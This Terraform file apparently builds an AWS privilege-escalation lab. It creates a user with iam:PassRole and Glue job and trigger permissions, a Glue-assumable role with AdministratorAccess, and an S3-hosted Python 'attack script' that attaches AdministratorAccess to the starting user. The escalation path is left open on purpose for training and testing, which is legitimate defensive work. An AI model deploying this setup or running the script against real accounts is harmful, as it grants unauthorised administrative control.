# iam-passrole+glue-createjob+glue-createtrigger privilege escalation scenario
#
# This scenario demonstrates how a user with iam:PassRole, glue:CreateJob, and
# glue:CreateTrigger can create a Glue job with an admin role and trigger it to
# grant themselves administrative access.

# Resource naming convention: pl-prod-glue-004-to-admin-{resource-type}
# All resources use provider = aws.prod

# Scenario-specific starting user
resource "aws_iam_user" "starting_user" {
  provider = aws.prod
  name     = "pl-prod-glue-004-to-admin-starting-user"

  tags = {
    Name        = "pl-prod-glue-004-to-admin-starting-user"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-createjob+glue-createtrigger"
    Purpose     = "starting-user"
  }
}

# Create access keys for the starting user
resource "aws_iam_access_key" "starting_user_key" {
  provider = aws.prod
  user     = aws_iam_user.starting_user.name
}

# S3 bucket for Glue job scripts
resource "aws_s3_bucket" "script_bucket" {
  provider = aws.prod
  bucket   = "pl-glue-scripts-glue-004-${var.account_id}-${var.resource_suffix}"

  tags = {
    Name        = "pl-glue-scripts-glue-004-${var.account_id}-${var.resource_suffix}"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-createjob+glue-createtrigger"
    Purpose     = "glue-job-scripts"
  }
}

# Block public access to the script bucket
resource "aws_s3_bucket_public_access_block" "script_bucket_pab" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id

  block_public_acls       = true
  block_public_policy     = true
  ignore_public_acls      = true
  restrict_public_buckets = true
}

# Upload the attack script to S3
resource "aws_s3_object" "attack_script" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id
  key      = "escalation_script.py"
  content  = <<-EOT
import boto3

# This script grants admin access to the starting user
iam = boto3.client('iam')

try:
    iam.attach_user_policy(
        UserName='${aws_iam_user.starting_user.name}',
        PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess'
    )
    print("Successfully attached AdministratorAccess to ${aws_iam_user.starting_user.name}")
except Exception as e:
    print(f"Error: {e}")
EOT

  tags = {
    Name        = "escalation-script"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-createjob+glue-createtrigger"
    Purpose     = "attack-script"
  }
}

# Bucket policy granting read access to all principals in the account
# This simulates an attacker-controlled bucket that grants access to specific accounts
resource "aws_s3_bucket_policy" "script_bucket_policy" {
  provider = aws.prod
  bucket   = aws_s3_bucket.script_bucket.id

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Sid    = "AllowAccountReadGetObject"
        Effect = "Allow"
        Principal = {
          AWS = "arn:aws:iam::${var.account_id}:root"
        }
        Action = [
          "s3:GetObject"
        ]
        Resource = "${aws_s3_bucket.script_bucket.arn}/*"
      }
    ]
  })
}

# Policy granting the starting user permissions to exploit this vulnerability
resource "aws_iam_user_policy" "starting_user_policy" {
  provider = aws.prod
  name     = "pl-prod-glue-004-to-admin-starting-user-policy"
  user     = aws_iam_user.starting_user.name

  policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Action = [
          "iam:PassRole"
        ]
        Resource = aws_iam_role.target_role.arn
      },
      {
        Effect = "Allow"
        Action = [
          "glue:CreateJob",
          "glue:CreateTrigger",
          "glue:GetJob",
          "glue:GetTrigger",
          "glue:GetJobRun",
          "glue:GetJobRuns"
        ]
        Resource = "*"
      },
      {
        Effect = "Allow"
        Action = [
          "sts:GetCallerIdentity"
        ]
        Resource = "*"
      }
    ]
  })
}

# Target admin role that will be passed to the Glue job
resource "aws_iam_role" "target_role" {
  provider = aws.prod
  name     = "pl-prod-glue-004-to-admin-target-role"

  assume_role_policy = jsonencode({
    Version = "2012-10-17"
    Statement = [
      {
        Effect = "Allow"
        Principal = {
          Service = "glue.amazonaws.com"
        }
        Action = "sts:AssumeRole"
      }
    ]
  })

  tags = {
    Name        = "pl-prod-glue-004-to-admin-target-role"
    Environment = var.environment
    Scenario    = "iam-passrole+glue-createjob+glue-createtrigger"
    Purpose     = "admin-target"
  }
}

# Attach AdministratorAccess to the target role
resource "aws_iam_role_policy_attachment" "target_role_admin_access" {
  provider   = aws.prod
  role       = aws_iam_role.target_role.name
  policy_arn = "arn:aws:iam::aws:policy/AdministratorAccess"
}

# Attach AWS Glue Service Role for Glue service permissions
resource "aws_iam_role_policy_attachment" "target_role_glue_service" {
  provider   = aws.prod
  role       = aws_iam_role.target_role.name
  policy_arn = "arn:aws:iam::aws:policy/service-role/AWSGlueServiceRole"
}
